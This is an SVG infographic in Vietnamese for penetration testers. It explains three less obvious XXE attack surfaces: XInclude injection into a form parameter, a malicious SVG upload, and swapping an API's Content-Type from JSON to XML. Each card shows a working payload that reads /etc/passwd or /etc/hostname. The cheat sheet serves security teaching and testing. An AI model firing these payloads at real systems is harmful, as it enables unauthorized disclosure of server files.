<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 950 480" width="100%" height="100%">
  <defs>
    <linearGradient id="bgGrad4" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#0a0d14"/>
      <stop offset="100%" stop-color="#141923"/>
    </linearGradient>
    <linearGradient id="cardGrad4" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1b2333"/>
      <stop offset="100%" stop-color="#131824"/>
    </linearGradient>
  </defs>

  <rect width="950" height="480" rx="16" fill="url(#bgGrad4)" stroke="#273142" stroke-width="2"/>
  
  <rect x="30" y="24" width="8" height="28" rx="4" fill="#00ff87"/>
  <text x="50" y="45" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="20" font-weight="700" fill="#ffffff">3 Bề Mặt Tấn Công XXE Ẩn (Hidden Attack Surface)</text>
  <text x="50" y="70" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="13" fill="#8899ac">Các vị trí XML bị giấu kín mà pentester &amp; bug hunter thường bỏ lỡ</text>

  <!-- Surface 1: XInclude -->
  <g transform="translate(40, 100)">
    <rect width="265" height="340" rx="12" fill="url(#cardGrad4)" stroke="#303c54" stroke-width="1.5"/>
    <rect x="0" y="0" width="265" height="40" rx="12" fill="#20293d"/>
    <text x="20" y="25" font-family="sans-serif" font-size="13" font-weight="700" fill="#79c0ff">1. XInclude Attack</text>

    <rect x="15" y="55" width="235" height="85" rx="8" fill="#0d1117" stroke="#252d3d"/>
    <text x="25" y="78" font-family="sans-serif" font-size="11" font-weight="600" fill="#ffa657">Tình huống:</text>
    <text x="25" y="96" font-family="sans-serif" font-size="10" fill="#8899ac">Client chỉ gửi Form URL-encoded</text>
    <text x="25" y="112" font-family="sans-serif" font-size="10" fill="#8899ac">hoặc backend SOAP tự gói XML,</text>
    <text x="25" y="128" font-family="sans-serif" font-size="10" fill="#ff7b72">không thể chèn &lt;!DOCTYPE&gt;!</text>

    <rect x="15" y="150" width="235" height="170" rx="8" fill="#0d1117" stroke="#252d3d"/>
    <text x="25" y="172" font-family="sans-serif" font-size="11" font-weight="600" fill="#00ff87">Giải pháp XInclude:</text>
    <text x="25" y="195" font-family="monospace" font-size="9.5" fill="#79c0ff">productId=&lt;foo</text>
    <text x="25" y="210" font-family="monospace" font-size="9.5" fill="#79c0ff">  xmlns:xi=</text>
    <text x="25" y="225" font-family="monospace" font-size="9" fill="#ffa657">&quot;http://www.w3.org/2001/</text>
    <text x="25" y="240" font-family="monospace" font-size="9" fill="#ffa657">XInclude&quot;&gt;</text>
    <text x="25" y="260" font-family="monospace" font-size="9.5" fill="#ff7b72">&lt;xi:include parse=&quot;text&quot;</text>
    <text x="25" y="278" font-family="monospace" font-size="9.5" fill="#7ee787">  href=&quot;file:///etc/passwd&quot;/&gt;</text>
    <text x="25" y="296" font-family="monospace" font-size="9.5" fill="#79c0ff">&lt;/foo&gt;</text>
  </g>

  <!-- Surface 2: File Upload SVG / Office -->
  <g transform="translate(340, 100)">
    <rect width="265" height="340" rx="12" fill="url(#cardGrad4)" stroke="#303c54" stroke-width="1.5"/>
    <rect x="0" y="0" width="265" height="40" rx="12" fill="#20293d"/>
    <text x="20" y="25" font-family="sans-serif" font-size="13" font-weight="700" fill="#ff9900">2. File Upload (SVG, DOCX)</text>

    <rect x="15" y="55" width="235" height="85" rx="8" fill="#0d1117" stroke="#252d3d"/>
    <text x="25" y="78" font-family="sans-serif" font-size="11" font-weight="600" fill="#ffa657">Bản chất ngầm:</text>
    <text x="25" y="96" font-family="sans-serif" font-size="10" fill="#8899ac">- SVG là XML nguyên bản!</text>
    <text x="25" y="112" font-family="sans-serif" font-size="10" fill="#8899ac">- File Office (.docx, .xlsx)</text>
    <text x="25" y="128" font-family="sans-serif" font-size="10" fill="#8899ac">  chính là file zip chứa XML</text>

    <rect x="15" y="150" width="235" height="170" rx="8" fill="#0d1117" stroke="#252d3d"/>
    <text x="25" y="172" font-family="sans-serif" font-size="11" font-weight="600" fill="#ff9900">Payload avatar.svg:</text>
    <text x="25" y="195" font-family="monospace" font-size="9.5" fill="#8b949e">&lt;?xml version=&quot;1.0&quot;?&gt;</text>
    <text x="25" y="212" font-family="monospace" font-size="9.5" fill="#79c0ff">&lt;!DOCTYPE test [</text>
    <text x="25" y="230" font-family="monospace" font-size="9.5" fill="#ffa657">&lt;!ENTITY x SYSTEM</text>
    <text x="25" y="248" font-family="monospace" font-size="9.5" fill="#7ee787">&quot;file:///etc/hostname&quot;&gt;]&gt;</text>
    <text x="25" y="268" font-family="monospace" font-size="9.5" fill="#d2a8ff">&lt;svg xmlns=&quot;...&quot;&gt;</text>
    <text x="25" y="286" font-family="monospace" font-size="9.5" fill="#ff7b72">&lt;text&gt;&amp;x;&lt;/text&gt;&lt;/svg&gt;</text>
    <text x="25" y="306" font-family="sans-serif" font-size="10" fill="#a5d6ff">-> Render ảnh lộ hostname</text>
  </g>

  <!-- Surface 3: Content-Type Spoofing -->
  <g transform="translate(640, 100)">
    <rect width="265" height="340" rx="12" fill="url(#cardGrad4)" stroke="#303c54" stroke-width="1.5"/>
    <rect x="0" y="0" width="265" height="40" rx="12" fill="#20293d"/>
    <text x="20" y="25" font-family="sans-serif" font-size="13" font-weight="700" fill="#d2a8ff">3. Content-Type Swapping</text>

    <rect x="15" y="55" width="235" height="85" rx="8" fill="#0d1117" stroke="#252d3d"/>
    <text x="25" y="78" font-family="sans-serif" font-size="11" font-weight="600" fill="#ffa657">API Mặc định:</text>
    <text x="25" y="96" font-family="sans-serif" font-size="10" fill="#8899ac">Gửi JSON thông thường</text>
    <text x="25" y="114" font-family="monospace" font-size="9.5" fill="#79c0ff">Content-Type: application/json</text>
    <text x="25" y="130" font-family="monospace" font-size="9.5" fill="#8b949e">{&quot;user&quot;: &quot;admin&quot;}</text>

    <rect x="15" y="150" width="235" height="170" rx="8" fill="#0d1117" stroke="#252d3d"/>
    <text x="25" y="172" font-family="sans-serif" font-size="11" font-weight="600" fill="#d2a8ff">Đổi sang XML:</text>
    <text x="25" y="195" font-family="monospace" font-size="9.5" fill="#ff7b72">Content-Type: application/xml</text>
    <text x="25" y="220" font-family="monospace" font-size="9.5" fill="#79c0ff">&lt;!DOCTYPE foo [</text>
    <text x="25" y="238" font-family="monospace" font-size="9.5" fill="#ffa657">&lt;!ENTITY xxe SYSTEM</text>
    <text x="25" y="256" font-family="monospace" font-size="9.5" fill="#7ee787">&quot;file:///etc/passwd&quot;&gt;]&gt;</text>
    <text x="25" y="276" font-family="monospace" font-size="9.5" fill="#d2a8ff">&lt;user&gt;&amp;xxe;&lt;/user&gt;</text>
    <text x="25" y="302" font-family="sans-serif" font-size="10" fill="#a5d6ff">-> Framework tự parse XML!</text>
  </g>
</svg>